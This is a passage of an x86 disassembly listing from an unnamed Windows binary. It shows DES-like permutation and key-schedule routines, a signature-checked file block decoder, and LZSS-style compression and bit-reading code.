                movzx   edx, byte_42C963[eax]
                xor     byte_42C942[eax], cl
                xor     byte_42C943[eax], dl
                add     eax, 4
                cmp     eax, 20h
                jl      short loc_40BC40
                mov     eax, [esp+10h+arg_8]
                dec     eax
                mov     ecx, 8
                mov     esi, offset unk_42C9B0
                mov     edi, offset byte_42C960
                sub     ebx, 30h
                rep movsd
                mov     [esp+10h+arg_8], eax
                test    eax, eax
                jge     short loc_40BC20

loc_40BC9D:                             ; CODE XREF: sub_40BAD0+137↑j
                xor     eax, eax
                pop     ebx

loc_40BCA0:                             ; CODE XREF: sub_40BAD0+22A↓j
                movsx   ecx, ds:byte_421D88[eax]
                movzx   edx, byte_42C93F[ecx]
                mov     [eax+ebp+601h], dl
                movsx   ecx, ds:byte_421D89[eax]
                movzx   edx, byte_42C93F[ecx]
                mov     [eax+ebp+602h], dl
                movsx   ecx, ds:byte_421D8A[eax]
                movzx   edx, byte_42C93F[ecx]
                mov     [eax+ebp+603h], dl
                movsx   ecx, ds:byte_421D8B[eax]
                movzx   edx, byte_42C93F[ecx]
                mov     [eax+ebp+604h], dl
                add     eax, 4
                cmp     eax, 40h
                jl      short loc_40BCA0
                mov     eax, [esp+0Ch+arg_0]
                push    40h
                push    eax
                push    offset byte_42C940
                call    sub_414550
                mov     esi, [esp+18h+arg_4]
                add     esp, 0Ch
                mov     edx, offset byte_42C940
                call    sub_40C110
                pop     edi
                pop     esi
                pop     ebp
                retn    0Ch
sub_40BAD0      endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================


sub_40BD30      proc near               ; CODE XREF: sub_40BA60+35↑p
                                        ; sub_40BA60+4C↑p

arg_0           = dword ptr  4

                push    ebx
                push    ebp
                push    esi
                mov     esi, eax
                xor     eax, eax

loc_40BD37:                             ; CODE XREF: sub_40BD30+23↓j
                mov     edx, eax
                sar     edx, 3
                mov     dl, [edx+esi]
                mov     cl, al
                and     cl, 7
                sar     dl, cl
                inc     eax
                and     dl, 1
                cmp     eax, 40h
                mov     byte ptr (CriticalSection.SpinCount+3)[eax], dl
                jl      short loc_40BD37
                xor     eax, eax
                jmp     short loc_40BD60
; ---------------------------------------------------------------------------
                align 10h

loc_40BD60:                             ; CODE XREF: sub_40BD30+27↑j
                                        ; sub_40BD30+8A↓j
                movsx   ecx, ds:byte_421E18[eax]
                movzx   edx, byte ptr (CriticalSection.SpinCount+3)[ecx]
                mov     [edi+eax+601h], dl
                movsx   ecx, ds:byte_421E19[eax]
                movzx   edx, byte ptr (CriticalSection.SpinCount+3)[ecx]
                mov     [edi+eax+602h], dl
                movsx   ecx, ds:byte_421E1A[eax]
                movzx   edx, byte ptr (CriticalSection.SpinCount+3)[ecx]
                mov     [edi+eax+603h], dl
                movsx   ecx, ds:byte_421E1B[eax]
                movzx   edx, byte ptr (CriticalSection.SpinCount+3)[ecx]
                mov     [edi+eax+604h], dl
                add     eax, 4
                cmp     eax, 38h
                jl      short loc_40BD60
                push    38h
                lea     ebx, [edi+601h]
                push    ebx
                push    offset unk_42C900
                call    sub_414550
                mov     eax, [esp+18h+arg_0]
                add     esp, 0Ch
                xor     ebp, ebp
                mov     [esp+0Ch+arg_0], eax
                lea     esp, [esp+0]

loc_40BDE0:                             ; CODE XREF: sub_40BD30+1D5↓j
                movsx   esi, ss:byte_421E80[ebp]
                push    esi
                push    offset unk_42C900
                push    ebx
                call    sub_414550
                mov     ecx, 1Ch
                sub     ecx, esi
                push    ecx
                lea     edx, unk_42C900[esi]
                push    edx
                push    offset unk_42C900
                call    sub_414550
                push    esi
                mov     eax, offset unk_42C91C
                sub     eax, esi
                push    ebx
                push    eax
                call    sub_414550
                movsx   esi, ss:byte_421E80[ebp]
                push    esi
                push    offset unk_42C91C
                push    ebx
                call    sub_414550
                mov     ecx, 1Ch
                sub     ecx, esi
                push    ecx
                lea     edx, unk_42C91C[esi]
                push    edx
                push    offset unk_42C91C
                call    sub_414550
                push    esi
                mov     eax, offset unk_42C938
                sub     eax, esi
                push    ebx
                push    eax
                call    sub_414550
                add     esp, 48h
                xor     eax, eax
                jmp     short loc_40BE60
; ---------------------------------------------------------------------------
                align 10h

loc_40BE60:                             ; CODE XREF: sub_40BD30+12B↑j
                                        ; sub_40BD30+1B4↓j
                movsx   ecx, ds:byte_421E50[eax]
                movzx   edx, byte ptr (CriticalSection.SpinCount+3)[ecx]
                mov     [edi+eax+601h], dl
                movsx   ecx, ds:byte_421E51[eax]
                movzx   edx, byte ptr (CriticalSection.SpinCount+3)[ecx]
                mov     [edi+eax+602h], dl
                movsx   ecx, ds:byte_421E52[eax]
                movzx   edx, byte ptr (CriticalSection.SpinCount+3)[ecx]
                mov     [edi+eax+603h], dl
                movsx   ecx, ds:byte_421E53[eax]
                movzx   edx, byte ptr (CriticalSection.SpinCount+3)[ecx]
                mov     [edi+eax+604h], dl
                movsx   ecx, ds:byte_421E54[eax]
                movzx   edx, byte ptr (CriticalSection.SpinCount+3)[ecx]
                mov     [edi+eax+605h], dl
                movsx   ecx, ds:byte_421E55[eax]
                movzx   edx, byte ptr (CriticalSection.SpinCount+3)[ecx]
                mov     [edi+eax+606h], dl
                add     eax, 6
                cmp     eax, 30h
                jl      loc_40BE60
                mov     esi, [esp+0Ch+arg_0]
                push    30h
                push    ebx
                push    esi
                call    sub_414550
                inc     ebp
                add     esi, 30h
                add     esp, 0Ch
                cmp     ebp, 10h
                mov     [esp+0Ch+arg_0], esi
                jl      loc_40BDE0
                pop     esi
                pop     ebp
                pop     ebx
                retn    4
sub_40BD30      endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================


sub_40BF20      proc near               ; CODE XREF: sub_40BAD0+D8↑p
                                        ; sub_40BAD0+168↑p

var_4           = dword ptr -4

                push    ecx
                xor     eax, eax

loc_40BF23:                             ; CODE XREF: sub_40BF20+7B↓j
                movsx   ecx, ds:byte_421DC8[eax]
                movzx   edx, byte ptr [ecx+edi-1]
                mov     [esi+eax+601h], dl
                movsx   ecx, ds:byte_421DC9[eax]
                movzx   edx, byte ptr [ecx+edi-1]
                mov     [esi+eax+602h], dl
                movsx   ecx, ds:byte_421DCA[eax]
                movzx   edx, byte ptr [ecx+edi-1]
                mov     [esi+eax+603h], dl
                movsx   ecx, ds:byte_421DCB[eax]
                movzx   edx, byte ptr [ecx+edi-1]
                mov     [esi+eax+604h], dl
                movsx   ecx, ds:byte_421DCC[eax]
                movzx   edx, byte ptr [ecx+edi-1]
                mov     [esi+eax+605h], dl
                movsx   ecx, ds:byte_421DCD[eax]
                movzx   edx, byte ptr [ecx+edi-1]
                mov     [esi+eax+606h], dl
                add     eax, 6
                cmp     eax, 30h
                jl      short loc_40BF23
                push    ebp
                lea     eax, [esi+601h]
                push    30h
                push    eax
                push    offset byte_42C980
                mov     [esp+14h+var_4], eax
                call    sub_414550
                mov     ebp, ebx
                add     esp, 0Ch
                xor     eax, eax
                sub     ebp, offset byte_42C980

loc_40BFC2:                             ; CODE XREF: sub_40BF20+ED↓j
                movzx   ecx, byte_42C980[eax+ebp]
                xor     byte_42C980[eax], cl
                movzx   edx, byte ptr [ebx+eax+1]
                xor     byte_42C981[eax], dl
                movzx   ecx, byte ptr [ebx+eax+2]
                xor     byte_42C982[eax], cl
                movzx   edx, byte ptr [ebx+eax+3]
                xor     byte_42C983[eax], dl
                movzx   ecx, byte ptr [ebx+eax+4]
                xor     byte_42C984[eax], cl
                movzx   edx, byte ptr [ebx+eax+5]
                xor     byte_42C985[eax], dl
                add     eax, 6
                cmp     eax, 30h
                jl      short loc_40BFC2
                mov     eax, edi
                call    sub_40C090
                xor     eax, eax
                pop     ebp
                lea     esp, [esp+0]

loc_40C020:                             ; CODE XREF: sub_40BF20+152↓j
                movsx   ecx, ds:byte_421DF8[eax]
                movzx   edx, byte ptr [ecx+edi-1]
                mov     [esi+eax+601h], dl
                movsx   ecx, ds:byte_421DF9[eax]
                movzx   edx, byte ptr [ecx+edi-1]
                mov     [esi+eax+602h], dl
                movsx   ecx, ds:byte_421DFA[eax]
                movzx   edx, byte ptr [ecx+edi-1]
                mov     [esi+eax+603h], dl
                movsx   ecx, ds:byte_421DFB[eax]
                movzx   edx, byte ptr [ecx+edi-1]
                mov     [esi+eax+604h], dl
                add     eax, 4
                cmp     eax, 20h
                jl      short loc_40C020
                mov     eax, [esp+4+var_4]
                push    20h
                push    eax
                push    edi
                call    sub_414550
                add     esp, 10h
                retn
sub_40BF20      endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================


sub_40C090      proc near               ; CODE XREF: sub_40BF20+F1↑p
                push    ebp
                push    esi
                push    edi
                xor     edi, edi
                mov     esi, eax
                mov     ecx, offset byte_42C981
                lea     ebp, [edi+8]
                nop

loc_40C0A0:                             ; CODE XREF: sub_40C090+71↓j
                mov     al, [ecx]
                mov     dl, [ecx-1]
                add     al, al
                add     al, [ecx+1]
                add     dl, dl
                add     dl, [ecx+4]
                add     al, al
                add     al, [ecx+2]
                movsx   edx, dl
                add     al, al
                add     al, [ecx+3]
                add     edx, edi
                shl     edx, 4
                movsx   eax, al
                lea     eax, unk_421E90[edx+eax]
                movzx   edx, byte ptr [eax]
                and     dl, 1
                mov     [esi], dl
                movzx   edx, byte ptr [eax]
                sar     dl, 1
                and     dl, 1
                mov     [esi+1], dl
                movzx   edx, byte ptr [eax]
                sar     dl, 2
                and     dl, 1
                mov     [esi+2], dl
                movzx   eax, byte ptr [eax]
                sar     al, 3
                and     al, 1
                mov     [esi+3], al
                add     edi, 4
                add     ecx, 6
                add     esi, 4
                sub     ebp, 1
                jnz     short loc_40C0A0
                pop     edi
                pop     esi
                pop     ebp
                retn
sub_40C090      endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================


sub_40C110      proc near               ; CODE XREF: sub_40BAD0+249↑p
                push    ebx
                xor     eax, eax
                push    ebp
                mov     [esi], eax
                push    edi
                mov     [esi+4], eax
                lea     edi, [edx+3]
                mov     eax, 1

loc_40C122:                             ; CODE XREF: sub_40C110+7A↓j
                lea     ecx, [eax-1]
                mov     ebx, ecx
                sar     ebx, 3
                lea     ebp, [ebx+esi]
                movzx   ebx, byte ptr [eax+edx-1]
                and     ecx, 7
                shl     bl, cl
                mov     ecx, eax
                sar     ecx, 3
                add     edi, 4
                or      [ebp+0], bl
                movzx   ebx, byte ptr [eax+edx]
                lea     ebp, [ecx+esi]
                mov     ecx, eax
                and     ecx, 7
                shl     bl, cl
                lea     ecx, [eax+1]
                or      [ebp+0], bl
                mov     ebx, ecx
                sar     ebx, 3
                lea     ebp, [ebx+esi]
                movzx   ebx, byte ptr [edi-5]
                and     ecx, 7
                shl     bl, cl
                lea     ecx, [eax+2]
                add     eax, 4
                or      [ebp+0], bl
                mov     ebx, ecx
                sar     ebx, 3
                lea     ebp, [ebx+esi]
                movzx   ebx, byte ptr [edi-4]
                and     ecx, 7
                shl     bl, cl
                lea     ecx, [eax-1]
                or      [ebp+0], bl
                cmp     ecx, 40h
                jl      short loc_40C122
                pop     edi
                pop     ebp
                pop     ebx
                retn
sub_40C110      endp


; =============== S U B R O U T I N E =======================================


sub_40C190      proc near               ; CODE XREF: sub_407940+C5↑p

var_768         = dword ptr -768h
var_764         = dword ptr -764h
var_760         = byte ptr -760h
var_4C          = byte ptr -4Ch
var_4B          = byte ptr -4Bh
var_4A          = byte ptr -4Ah
var_49          = byte ptr -49h
var_48          = byte ptr -48h
var_47          = byte ptr -47h
var_46          = byte ptr -46h
var_45          = byte ptr -45h
var_44          = byte ptr -44h
var_4           = dword ptr -4
arg_0           = dword ptr  4
arg_4           = dword ptr  8

                sub     esp, 768h
                mov     eax, ___security_cookie
                xor     eax, esp
                mov     [esp+768h+var_4], eax
                mov     eax, [esp+768h+arg_0]
                push    ebp
                mov     ebp, [esp+76Ch+arg_4]
                push    esi
                push    offset aRb      ; "rb"
                push    eax
                call    sub_40ED4E
                mov     esi, eax
                add     esp, 8
                test    esi, esi
                jz      loc_40C29C
                push    edi
                push    esi
                call    sub_40F9B4
                push    2
                push    0
                push    esi
                call    sub_40F65C
                push    esi
                call    sub_40F564
                push    0
                push    0
                push    esi
                mov     edi, eax
                call    sub_40F65C
                add     esp, 20h

loc_40C1F2:                             ; CODE XREF: sub_40C190+FA↓j
                push    esi
                push    8
                lea     eax, [esp+77Ch+var_4C]
                push    1
                push    eax
                call    sub_40F10A
                mov     cl, [esp+784h+var_4C]
                add     esp, 10h
                cmp     cl, byte_426604
                jnz     short loc_40C27F
                mov     dl, [esp+774h+var_4B]
                cmp     dl, byte_426605
                jnz     short loc_40C27F
                mov     al, [esp+774h+var_4A]
                cmp     al, byte_426606
                jnz     short loc_40C27F
                mov     cl, [esp+774h+var_49]
                cmp     cl, byte_426607
                jnz     short loc_40C27F
                mov     dl, [esp+774h+var_48]
                cmp     dl, byte_426600
                jnz     short loc_40C27F
                mov     al, [esp+774h+var_47]
                cmp     al, byte_426601
                jnz     short loc_40C27F
                mov     cl, [esp+774h+var_46]
                cmp     cl, byte_426602
                jnz     short loc_40C27F
                mov     dl, [esp+774h+var_45]
                cmp     dl, byte_426603
                jz      short loc_40C2B5

loc_40C27F:                             ; CODE XREF: sub_40C190+84↑j
                                        ; sub_40C190+93↑j ...
                push    esi
                call    sub_40E3F9
                add     esp, 4
                test    eax, eax
                jz      loc_40C1F2

loc_40C290:                             ; CODE XREF: sub_40C190+144↓j
                                        ; sub_40C190+14A↓j ...
                push    esi
                call    sub_40F867
                add     esp, 4
                xor     eax, eax

loc_40C29B:                             ; CODE XREF: sub_40C190+1D6↓j
                pop     edi

loc_40C29C:                             ; CODE XREF: sub_40C190+36↑j
                mov     ecx, [esp+770h+var_4]
                pop     esi
                pop     ebp
                xor     ecx, esp
                call    @__security_check_cookie@4 ; __security_check_cookie(x)
                add     esp, 768h
                retn    8
; ---------------------------------------------------------------------------

loc_40C2B5:                             ; CODE XREF: sub_40C190+ED↑j
                push    esi
                push    1
                lea     eax, [esp+77Ch+var_764]
                push    4
                push    eax
                call    sub_40F10A
                push    esi
                call    sub_40F564
                mov     ecx, [esp+788h+var_764]
                add     esp, 14h
                cmp     ecx, 40h
                jnb     short loc_40C290
                add     eax, ecx
                cmp     eax, edi
                jnb     short loc_40C290
                push    esi
                push    1
                push    ecx
                lea     ecx, [esp+780h+var_44]
                push    ecx
                call    sub_40F10A
                push    esi
                push    1
                lea     edx, [esp+78Ch+var_768]
                push    4
                push    edx
                call    sub_40F10A
                push    esi
                call    sub_40F564
                mov     ecx, [esp+798h+var_768]
                add     eax, ecx
                add     esp, 24h
                cmp     eax, edi
                jnb     short loc_40C290
                cmp     ecx, 1000h
                ja      loc_40C290
                push    ebx
                push    ecx
                call    sub_40F94F
                mov     ecx, [esp+77Ch+var_768]
                push    esi
                push    1
                mov     ebx, eax
                push    ecx
                push    ebx
                call    sub_40F10A
                mov     edx, [esp+78Ch+var_768]
                add     esp, 14h
                push    edx
                mov     edx, [esp+77Ch+var_764]
                push    ebx
                lea     eax, [esp+780h+var_44]
                mov     ecx, ebp
                lea     edi, [esp+780h+var_760]
                call    sub_40B990
                push    ebx
                call    sub_40F15B
                push    esi
                call    sub_40F867
                add     esp, 8
                mov     eax, 1
                pop     ebx
                jmp     loc_40C29B
sub_40C190      endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================


sub_40C370      proc near               ; CODE XREF: sub_40CD50+22A↓p
                                        ; sub_40CD50+241↓p ...

var_8           = dword ptr -8
var_4           = dword ptr -4
arg_0           = dword ptr  4

                sub     esp, 8
                push    ebx
                push    ebp
                mov     ebp, [esp+10h+arg_0]
                movsx   ebx, bp
                lea     ecx, [ebx+eax+8]
                mov     [esp+10h+var_4], ecx
                movzx   cx, byte ptr [ecx]
                push    esi
                mov     esi, 1001h
                add     cx, si
                movzx   esi, cx
                mov     ecx, 1000h
                mov     [eax+ebx*2+1048h], cx
                mov     [eax+ebx*2+304Ah], cx
                xor     ecx, ecx
                push    edi
                mov     edx, 1
                mov     [esp+18h+var_8], ebx
                mov     [eax+1046h], cx
                jmp     short loc_40C3C2
; ---------------------------------------------------------------------------

loc_40C3BE:                             ; CODE XREF: sub_40C370+DF↓j
                                        ; sub_40C370:loc_40C480↓j
                mov     ebx, [esp+18h+var_8]

loc_40C3C2:                             ; CODE XREF: sub_40C370+4C↑j
                                        ; sub_40C370+12E↓j ...
                test    dx, dx
                jl      short loc_40C3F9
                movsx   edx, si
                movzx   ecx, word ptr [eax+edx*2+304Ah]
                mov     edx, 1000h
                cmp     cx, dx
                jnz     short loc_40C412
                movsx   ecx, si
                pop     edi
                mov     [eax+ecx*2+304Ah], bp
                mov     [eax+ebx*2+524Ch], si
                pop     esi
                pop     ebp
                pop     ebx
                add     esp, 8
                retn    4
; ---------------------------------------------------------------------------

loc_40C3F9:                             ; CODE XREF: sub_40C370+55↑j
                movsx   ecx, si
                movzx   ecx, word ptr [eax+ecx*2+1048h]
                mov     edx, 1000h
                cmp     cx, dx
                jz      loc_40C557

loc_40C412:                             ; CODE XREF: sub_40C370+6A↑j
                movzx   esi, cx
                mov     ecx, 1
                movsx   edi, si
                lea     ecx, [ecx+0]

loc_40C420:                             ; CODE XREF: sub_40C370+D5↓j
                mov     ebp, [esp+18h+var_4]
                movsx   edx, cx
                lea     ebx, [edx+edi]
                movzx   dx, byte ptr [edx+ebp]
                movzx   bx, byte ptr [ebx+eax+8]
                sub     dx, bx
                movzx   edx, dx
                test    dx, dx
                jnz     short loc_40C447
                inc     ecx
                cmp     cx, 3Ch
                jl      short loc_40C420

loc_40C447:                             ; CODE XREF: sub_40C370+CE↑j
                cmp     cx, 2
                mov     ebp, [esp+18h+arg_0]
                jle     loc_40C3BE
                cmp     cx, [eax+1046h]
                jle     short loc_40C480
                mov     ebx, ebp
                sub     ebx, esi
                and     ebx, 0FFFh
                dec     ebx
                cmp     cx, 3Ch
                mov     [eax+1044h], bx
                mov     [eax+1046h], cx
                jge     short loc_40C4B0
                cmp     cx, cx

loc_40C480:                             ; CODE XREF: sub_40C370+EC↑j
                jnz     loc_40C3BE
                mov     ebx, [esp+18h+var_8]
                mov     ecx, ebx
                sub     ecx, edi
                movzx   edi, word ptr [eax+1044h]
                and     ecx, 0FFFh
                dec     ecx
                cmp     ecx, edi
                jnb     loc_40C3C2
                mov     [eax+1044h], cx
                jmp     loc_40C3C2
; ---------------------------------------------------------------------------

loc_40C4B0:                             ; CODE XREF: sub_40C370+10B↑j
                mov     edx, [esp+18h+var_8]
                movsx   ecx, si
                movzx   edi, word ptr [eax+ecx*2+524Ch]
                mov     [eax+edx*2+524Ch], di
                movzx   edi, word ptr [eax+ecx*2+1048h]
                mov     [eax+edx*2+1048h], di
                movzx   edi, word ptr [eax+ecx*2+304Ah]
                mov     [eax+edx*2+304Ah], di
                movsx   edx, word ptr [eax+ecx*2+1048h]
                mov     [eax+edx*2+524Ch], bp
                movsx   edx, word ptr [eax+ecx*2+304Ah]
                mov     [eax+edx*2+524Ch], bp
                movsx   edx, word ptr [eax+ecx*2+524Ch]
                cmp     [eax+edx*2+304Ah], si
                jnz     short loc_40C538
                pop     edi
                mov     [eax+edx*2+304Ah], bp
                pop     esi
                mov     edx, 1000h
                pop     ebp
                mov     [eax+ecx*2+524Ch], dx
                pop     ebx
                add     esp, 8
                retn    4
; ---------------------------------------------------------------------------

loc_40C538:                             ; CODE XREF: sub_40C370+1A7↑j
                pop     edi
                mov     [eax+edx*2+1048h], bp
                pop     esi
                mov     edx, 1000h
                pop     ebp
                mov     [eax+ecx*2+524Ch], dx
                pop     ebx
                add     esp, 8
                retn    4
; ---------------------------------------------------------------------------

loc_40C557:                             ; CODE XREF: sub_40C370+9C↑j
                movsx   ecx, si
                pop     edi
                mov     [eax+ecx*2+1048h], bp
                mov     [eax+ebx*2+524Ch], si
                pop     esi
                pop     ebp
                pop     ebx
                add     esp, 8
                retn    4
sub_40C370      endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================


sub_40C580      proc near               ; CODE XREF: sub_40CD50+58B↓p
                                        ; sub_40CD50+5F4↓p
                push    esi
                movsx   esi, bx
                mov     ecx, 1000h
                cmp     [eax+esi*2+524Ch], cx
                jz      loc_40C6BA
                movzx   edx, word ptr [eax+esi*2+304Ah]
                cmp     dx, cx
                movzx   ecx, word ptr [eax+esi*2+1048h]
                push    edi
                jz      loc_40C668
                mov     edi, 1000h
                cmp     cx, di
                jnz     short loc_40C5C3
                movzx   ecx, dx
                jmp     loc_40C668
; ---------------------------------------------------------------------------

loc_40C5C3:                             ; CODE XREF: sub_40C580+39↑j
                movzx   ecx, cx
                movsx   edx, cx
                push    ebp
                lea     edi, [eax+edx*2+304Ah]
                mov     ebp, 1000h
                cmp     [edi], bp
                jz      short loc_40C647
                jmp     short loc_40C5E0
; ---------------------------------------------------------------------------
                align 10h

loc_40C5E0:                             ; CODE XREF: sub_40C580+5B↑j
                                        ; sub_40C580+72↓j
                movzx   ecx, word ptr [edi]
                movsx   edx, cx
                lea     edi, [eax+edx*2+304Ah]
                mov     edx, ebp
                cmp     [edi], dx
                jnz     short loc_40C5E0
                movsx   edx, cx
                movsx   edi, word ptr [eax+edx*2+524Ch]
                mov     bp, [eax+edx*2+1048h]
                mov     [eax+edi*2+304Ah], bp
                movsx   edi, word ptr [eax+edx*2+1048h]
                mov     bp, [eax+edx*2+524Ch]
                mov     [eax+edi*2+524Ch], bp
                mov     di, [eax+esi*2+1048h]
                mov     [eax+edx*2+1048h], di
                movsx   edi, word ptr [eax+esi*2+1048h]
                mov     [eax+edi*2+524Ch], cx

loc_40C647:                             ; CODE XREF: sub_40C580+59↑j
                mov     di, [eax+esi*2+304Ah]
                mov     [eax+edx*2+304Ah], di
                movsx   edx, word ptr [eax+esi*2+304Ah]
                mov     [eax+edx*2+524Ch], cx
                pop     ebp

loc_40C668:                             ; CODE XREF: sub_40C580+2B↑j
                                        ; sub_40C580+3E↑j
                mov     di, [eax+esi*2+524Ch]
                movsx   edx, cx
                mov     [eax+edx*2+524Ch], di
                movsx   edx, word ptr [eax+esi*2+524Ch]
                pop     edi
                cmp     [eax+edx*2+304Ah], bx
                jnz     short loc_40C6A5
                mov     [eax+edx*2+304Ah], cx
                mov     ecx, 1000h
                mov     [eax+esi*2+524Ch], cx
                pop     esi
                retn
; ---------------------------------------------------------------------------

loc_40C6A5:                             ; CODE XREF: sub_40C580+10C↑j
                mov     [eax+edx*2+1048h], cx
                mov     ecx, 1000h
                mov     [eax+esi*2+524Ch], cx

loc_40C6BA:                             ; CODE XREF: sub_40C580+11↑j
                pop     esi
                retn
sub_40C580      endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================


sub_40C6C0      proc near               ; CODE XREF: sub_40CCF0:loc_40CD10↓p
                                        ; sub_40D3F0+178↓p

Buffer          = dword ptr -8
NumberOfBytesRead= dword ptr -4

                sub     esp, 8
                cmp     byte ptr [esi+8378h], 8
                ja      loc_40C798
                push    ebx
                push    ebp
                push    edi
                xor     ebx, ebx
                jmp     short loc_40C6E0
; ---------------------------------------------------------------------------
                align 10h

loc_40C6E0:                             ; CODE XREF: sub_40C6C0+15↑j
                                        ; sub_40C6C0+CF↓j
                mov     eax, [esi+83A8h]
                mov     [esp+14h+Buffer], ebx
                cmp     eax, ebx
                jnz     short loc_40C712
                mov     edx, [esi+8384h]
                push    ebx             ; lpOverlapped
                lea     eax, [esp+18h+NumberOfBytesRead]
                push    eax             ; lpNumberOfBytesRead
                push    1               ; nNumberOfBytesToRead
                lea     ecx, [esp+20h+Buffer]
                push    ecx             ; lpBuffer
                push    edx             ; hFile
                mov     [esp+28h+NumberOfBytesRead], ebx
                call    ds:ReadFile
                mov     ebp, [esp+14h+NumberOfBytesRead]
                jmp     short loc_40C74F
; ---------------------------------------------------------------------------

loc_40C712:                             ; CODE XREF: sub_40C6C0+2C↑j
                cmp     eax, 1
                jnz     short loc_40C754
                mov     edi, [esi+83A0h]
                mov     ebp, eax
                mov     eax, [esi+8394h]
                lea     ecx, [edi+1]
                cmp     ecx, eax
                jle     short loc_40C730
                sub     eax, edi
                mov     ebp, eax

loc_40C730:                             ; CODE XREF: sub_40C6C0+6A↑j
                mov     edx, [esi+838Ch]
                push    ebp
                add     edx, edi
                push    edx
                lea     eax, [esp+1Ch+Buffer]
                push    eax
                call    sub_414550
                add     esp, 0Ch
                add     edi, ebp
                mov     [esi+83A0h], edi

loc_40C74F:                             ; CODE XREF: sub_40C6C0+50↑j
                cmp     ebp, 1
                jz      short loc_40C759

loc_40C754:                             ; CODE XREF: sub_40C6C0+55↑j
                or      eax, 0FFFFFFFFh
                jmp     short loc_40C75D
; ---------------------------------------------------------------------------

loc_40C759:                             ; CODE XREF: sub_40C6C0+92↑j
                mov     eax, [esp+14h+Buffer]

loc_40C75D:                             ; CODE XREF: sub_40C6C0+97↑j
                mov     ecx, 0FFFFh
                movzx   edx, ax
                cmp     ax, cx
                jnz     short loc_40C76C
                xor     edx, edx

loc_40C76C:                             ; CODE XREF: sub_40C6C0+A8↑j
                mov     al, [esi+8378h]
                movzx   edi, al
                mov     ecx, 8
                sub     ecx, edi
                shl     edx, cl
                add     al, 8
                mov     [esi+8378h], al
                or      [esi+8376h], dx
                cmp     al, 8
                jbe     loc_40C6E0
                pop     edi
                pop     ebp
                pop     ebx

loc_40C798:                             ; CODE XREF: sub_40C6C0+A↑j
                movzx   eax, word ptr [esi+8376h]
                dec     byte ptr [esi+8378h]
                movzx   ecx, ax
                lea     edx, [eax+eax]
                movzx   eax, cx
                mov     [esi+8376h], dx
                shr     eax, 0Fh
                add     esp, 8
                retn
sub_40C6C0      endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================


sub_40C7C0      proc near               ; CODE XREF: sub_40D3F0:loc_40D530↓p

Buffer          = dword ptr -8
NumberOfBytesRead= dword ptr -4

                sub     esp, 8
                cmp     byte ptr [esi+8378h], 8
                ja      loc_40C898
                push    ebx
                push    ebp
                push    edi
                xor     ebx, ebx
                jmp     short loc_40C7E0
; ---------------------------------------------------------------------------
                align 10h

loc_40C7E0:                             ; CODE XREF: sub_40C7C0+15↑j
                                        ; sub_40C7C0+CF↓j
                mov     eax, [esi+83A8h]
                mov     [esp+14h+Buffer], ebx
                cmp     eax, ebx
                jnz     short loc_40C812
                mov     edx, [esi+8384h]
                push    ebx             ; lpOverlapped
                lea     eax, [esp+18h+NumberOfBytesRead]
                push    eax             ; lpNumberOfBytesRead
                push    1               ; nNumberOfBytesToRead
                lea     ecx, [esp+20h+Buffer]
                push    ecx             ; lpBuffer
                push    edx             ; hFile
                mov     [esp+28h+NumberOfBytesRead], ebx
                call    ds:ReadFile
                mov     ebp, [esp+14h+NumberOfBytesRead]
                jmp     short loc_40C84F
; ---------------------------------------------------------------------------

loc_40C812:                             ; CODE XREF: sub_40C7C0+2C↑j
                cmp     eax, 1
                jnz     short loc_40C854
                mov     edi, [esi+83A0h]
                mov     ebp, eax
                mov     eax, [esi+8394h]
                lea     ecx, [edi+1]
                cmp     ecx, eax
                jle     short loc_40C830
                sub     eax, edi
                mov     ebp, eax

loc_40C830:                             ; CODE XREF: sub_40C7C0+6A↑j
                mov     edx, [esi+838Ch]
                push    ebp
                add     edx, edi
                push    edx
                lea     eax, [esp+1Ch+Buffer]
                push    eax
                call    sub_414550
                add     esp, 0Ch
                add     edi, ebp
                mov     [esi+83A0h], edi

loc_40C84F:                             ; CODE XREF: sub_40C7C0+50↑j
                cmp     ebp, 1
                jz      short loc_40C859

loc_40C854:                             ; CODE XREF: sub_40C7C0+55↑j
                or      eax, 0FFFFFFFFh
                jmp     short loc_40C85D
; ---------------------------------------------------------------------------

loc_40C859:                             ; CODE XREF: sub_40C7C0+92↑j
                mov     eax, [esp+14h+Buffer]

loc_40C85D:                             ; CODE XREF: sub_40C7C0+97↑j
                mov     ecx, 0FFFFh
                movzx   edx, ax
                cmp     ax, cx
                jnz     short loc_40C86C
                xor     edx, edx

loc_40C86C:                             ; CODE XREF: sub_40C7C0+A8↑j
                mov     al, [esi+8378h]
                movzx   edi, al
                mov     ecx, 8
                sub     ecx, edi
                shl     edx, cl
                add     al, 8
                mov     [esi+8378h], al
                or      [esi+8376h], dx
                cmp     al, 8
                jbe     loc_40C7E0
                pop     edi
                pop     ebp
                pop     ebx

loc_40C898:                             ; CODE XREF: sub_40C7C0+A↑j
                movzx   eax, word ptr [esi+8376h]
                add     byte ptr [esi+8378h], 0F8h
                movzx   ecx, ax
                shl     eax, 8
                mov     [esi+8376h], ax
                movzx   eax, cx
                shr     eax, 8
                add     esp, 8
                retn
sub_40C7C0      endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================


sub_40C8C0      proc near               ; CODE XREF: sub_40CC80+41↓p
                push    edi
                mov     edi, eax
                mov     al, [esi+837Ch]
                mov     cl, al
                mov     edx, edi
                shr     dx, cl
                add     al, bl
                mov     [esi+837Ch], al
                or      [esi+837Ah], dx
                cmp     al, 8
                jb      short loc_40C947
                movzx   eax, byte ptr [esi+837Bh]
                push    eax             ; Buffer
                mov     eax, esi
                call    sub_40D790
                cmp     eax, 0FFFFFFFFh
                jz      short loc_40C947
                add     byte ptr [esi+837Ch], 0F8h
                cmp     byte ptr [esi+837Ch], 8
                jb      short loc_40C93C
                movzx   ecx, word ptr [esi+837Ah]
                push    ecx             ; Buffer
                mov     eax, esi
                call    sub_40D790
                cmp     eax, 0FFFFFFFFh
                jz      short loc_40C947
                add     byte ptr [esi+837Ch], 0F8h
                movzx   edx, byte ptr [esi+837Ch]
                add     dword ptr [esi+4], 2
                mov     ecx, ebx
